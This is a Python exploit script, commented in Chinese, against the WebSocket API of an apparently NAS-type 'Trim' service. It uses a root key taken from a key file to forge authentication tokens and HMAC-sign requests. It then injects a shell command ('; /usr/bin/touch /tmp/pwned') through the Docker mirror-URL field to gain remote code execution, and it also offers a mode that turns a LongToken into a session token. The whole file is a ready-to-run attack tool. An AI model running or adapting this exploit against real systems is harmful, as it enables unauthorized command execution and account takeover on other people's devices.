import websocket
import json
import time
import base64
import argparse
import hashlib
import hmac
import os
import sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes

# --- 目标配置 ---
TARGET_URL = "ws://192.168.108.168:5666/websocket?type=main"

# 攻击负载 (Mode 1 使用)
CMD_TO_EXECUTE = "/usr/bin/touch /tmp/pwned; /usr/bin/echo"
RCE_PAYLOAD_URL = f"https://test.example.com ; {CMD_TO_EXECUTE}"

class TrimProtocol:
    """处理 Trim 协议的加密、解密和签名逻辑"""
    def __init__(self, key_path):
        self.root_aes_key = self._load_root_key(key_path)

    def _load_root_key(self, path):
        if not os.path.exists(path):
            print(f"❌ [Error] 找不到密钥文件: {path}")
            sys.exit(1)
        with open(path, 'rb') as f:
            f.seek(100)
            key = f.read(32)
            print(f"🔑 [Key] 已加载 Root Key: {key.hex().upper()[:]}...")
            return key

    def get_reqid(self):
        return str(int(time.time() * 100000))

    def generate_fresh_token(self):
        """
        [Mode 1 核心]
        利用 Root Key 自行构造一个合法的 Token。
        服务器网关只校验 Token 能否解密以及签名是否匹配，不一定校验 Token 是否在数据库中。
        """
        # 1. 生成随机的 15 字节 Session Key
        raw_session_key = get_random_bytes(15)
        
        # 2. 构造 HMAC Key (Session Key + 0x6F)
        hmac_key = bytearray(raw_session_key)
        hmac_key.append(111) 
        
        # 3. 使用 Root Key 加密 Session Key 生成 Token 字符串
        iv = get_random_bytes(16)
        cipher = AES.new(self.root_aes_key, AES.MODE_CBC, iv)
        # Pad 到 16 字节 (15 + 1 byte padding 0x01)
        ciphertext = cipher.encrypt(pad(raw_session_key, AES.block_size))
        
        token_blob = iv + ciphertext
        token_str = base64.b64encode(token_blob).decode('utf-8')
        
        return token_str, hmac_key

    def extract_key_from_token(self, token_str):
        """
        [Mode 2 核心]
        从已有的 LongToken 中解密出 HMAC Key。
        """
        try:
            token_bytes = base64.b64decode(token_str)
            iv = token_bytes[:16]
            ciphertext = token_bytes[16:32]
            
            cipher = AES.new(self.root_aes_key, AES.MODE_CBC, iv)
            decrypted = cipher.decrypt(ciphertext)
            
            # 取前15字节 + 0x6F
            session_key = decrypted[:15]
            hmac_key = bytearray(session_key)
            hmac_key.append(111)
            return hmac_key
        except Exception as e:
            print(f"❌ Token 解密失败: {e}")
            return None

    def sign_packet(self, payload_dict, hmac_key):
        """对 Payload 进行签名并返回最终数据包字符串"""
        json_str = json.dumps(payload_dict, separators=(',', ':'))
        signature = hmac.new(hmac_key, json_str.encode('utf-8'), hashlib.sha256).digest()
        sig_b64 = base64.b64encode(signature).decode('utf-8')
        # 格式: Sig + JSON (无等号)
        return f"{sig_b64}{json_str}"


class TrimAttacker:
    def __init__(self, mode, key_path, long_token=None):
        self.protocol = TrimProtocol(key_path)
        self.ws = None
        self.si = ""
        self.step = 0
        self.mode = mode # 'rce' or 'login'
        self.long_token = long_token

    def on_open(self, ws):
        print(f"\n[1/2] 连接建立，发送握手包...")
        # 必须先握手拿到 SI
        payload = {"reqid": self.protocol.get_reqid(), "req": "util.crypto.getRSAPub"}
        ws.send(json.dumps(payload))
        self.step = 1

    def on_message(self, ws, message):
        try:
            # 解析响应包
            if message.startswith('{'):
                data = json.loads(message)
            elif message.find('{') > -1:
                data = json.loads(message[message.find('{'):])
            else:
                return

            # --- 步骤 1: 获取 SI ---
            if self.step == 1 and "si" in data:
                self.si = str(data["si"])
                print(f"✅ [1/2] 握手成功 SI: {self.si}")
                
                if self.mode == "rce":
                    self.do_rce(ws)
                elif self.mode == "login":
                    self.do_login(ws)
                
                self.step = 2
                return

            # --- 步骤 2: 处理响应 ---
            if self.step == 2:
                print(f"\n📩 [Response]:\n{json.dumps(data, indent=2)}")
                
                if self.mode == "login" and data.get("result") == "succ":
                    print(f"\n🎉 [2/2] Token 获取成功")
                    print(f"Token: {data.get('token')}")
                    print(f"UID:   {data.get('uid')}")
                elif self.mode == "rce" and (data.get("result") == "succ" or data.get("errno") == 0):
                    print(f"\n🎉 [2/2] Exploit 发送成功")
                    print(f"注入命令: {CMD_TO_EXECUTE}")
                else:
                    print(f"\n❌ [操作失败] Errno: {data.get('errno', 'Unknown')}")
                
                ws.close()

        except Exception as e:
            print(f"❌ 运行异常: {e}")
            ws.close()

    def do_rce(self, ws):
        """功能 1: 仅凭 RSA 签名进行命令执行"""
        print(f"\n[*] Mode: RCE")
        
        # 1. 凭空生成一个合法的临时 Token
        fake_token, hmac_key = self.protocol.generate_fresh_token()
        print(f"[*] 生成伪造 Token: {fake_token[:]}...")
        
        # 2. 构造 Payload
        payload = {
            "reqid": self.protocol.get_reqid(),
            "req": "appcgi.dockermgr.systemMirrorAdd",
            "url": RCE_PAYLOAD_URL,
            "name": "RSA_Only_Exploit",
            "token": fake_token, # 放入伪造的 Token 用于过网关验签
            "si": self.si
        }
        
        # 3. 签名并发送
        packet = self.protocol.sign_packet(payload, hmac_key)
        print(f"[>] 发送 Payload...")
        print(f"[>] Payload 内容: {packet[:]}")
        ws.send(packet)

    def do_login(self, ws):
        """功能 2: 使用 LongToken 换取会话 Token"""
        print(f"\n[*] Mode: Login (LongToken)")
        
        # 1. 从给定的 LongToken 解密出 Key
        hmac_key = self.protocol.extract_key_from_token(self.long_token)
        if not hmac_key:
            print("❌ 无法解密 LongToken")
            ws.close()
            return

        # 2. 构造 Payload
        payload = {
            "req": "user.tokenLogin",
            "reqid": self.protocol.get_reqid(),
            "token": self.long_token, 
            "deviceType": "Browser",
            "deviceName": "Python-Tool",
            "did": "python-tool-did",
            "si": self.si
        }

        # 3. 签名并发送
        packet = self.protocol.sign_packet(payload, hmac_key)
        print(f"[>] 发送 Login 包...")
        ws.send(packet)

    def run(self):
        self.ws = websocket.WebSocketApp(TARGET_URL,
                                         on_open=self.on_open,
                                         on_message=self.on_message)
        self.ws.run_forever()

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-k", "--key", required=True, help="rsa_private_key.pem 文件路径")
    
    subparsers = parser.add_subparsers(dest="command", help="功能模式", required=True)

    # 模式 1: RCE (不需要 LongToken)
    rce_parser = subparsers.add_parser("rce", help="直接执行命令")
    
    # 模式 2: Get Token (需要 LongToken)
    login_parser = subparsers.add_parser("login", help="使用 LongToken 获取会话 Token")
    login_parser.add_argument("-t", "--token", required=True, help="你的 LongToken")

    args = parser.parse_args()

    # 启动
    attacker = None
    if args.command == "rce":
        attacker = TrimAttacker("rce", args.key)
    elif args.command == "login":
        attacker = TrimAttacker("login", args.key, long_token=args.token)
    
    if attacker:
        attacker.run()